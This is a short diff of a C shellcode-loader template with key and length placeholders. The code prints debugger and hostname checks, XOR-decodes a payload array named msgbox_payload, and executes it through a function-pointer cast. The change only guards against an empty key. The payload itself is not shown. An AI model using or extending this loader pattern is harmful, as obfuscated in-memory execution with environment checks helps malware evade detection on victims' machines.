@@ -12,7 +12,6 @@ void main() {
 
     char k[] = "%KEY%";
     size_t k_len = strlen(k);
-    short p_l =  %LENGTH%; //payload length
     
     printf("is_debugged: %d\n", is_debugged);
     printf("hostname: %s\n", hostname);
@@ -28,9 +27,12 @@ void main() {
     }
 
     // to fix
-    for (size_t i = 0; i < ss; ++i) {
-        msgbox_payload[i] ^= k[i % k_len];
+    if (k_len != 0) {
+        for (size_t i = 0; i < ss; ++i) {
+            msgbox_payload[i] ^= k[i % k_len];
+        }
     }
+    
 
     ((void (*)())msgbox_payload)();
 }
